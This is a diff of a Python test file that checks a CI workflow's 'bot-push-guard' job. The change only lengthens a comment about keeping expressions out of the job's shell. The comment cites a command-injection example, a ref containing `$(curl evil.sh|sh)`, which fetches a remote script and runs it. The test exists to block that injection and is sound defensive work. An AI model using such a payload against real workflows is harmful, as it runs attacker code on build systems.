@@ -722,7 +722,10 @@ class WiringTests(unittest.TestCase):
         # permits `$( )`, backticks and quotes inside a ref, so
         # `x$(curl evil.sh|sh)` would execute in this job on every pull request.
         # The rule is pinned, not the instance — no expression of any kind may
-        # appear in this job's shell; event data travels through `env:`.
+        # appear in this job's shell; event data travels through `env:`. The
+        # same rule is asserted for *every* job in every workflow in
+        # `tests/test_workflow_run_blocks.py` (#683); this one stays because it
+        # also pins the `env:` variables this job's script has to read.
         ci = self._read(".github/workflows/ci.yml")
         script = job_run_scripts(ci, "bot-push-guard")
         self.assertIn("bot_push_after_human_push_check.py", script)
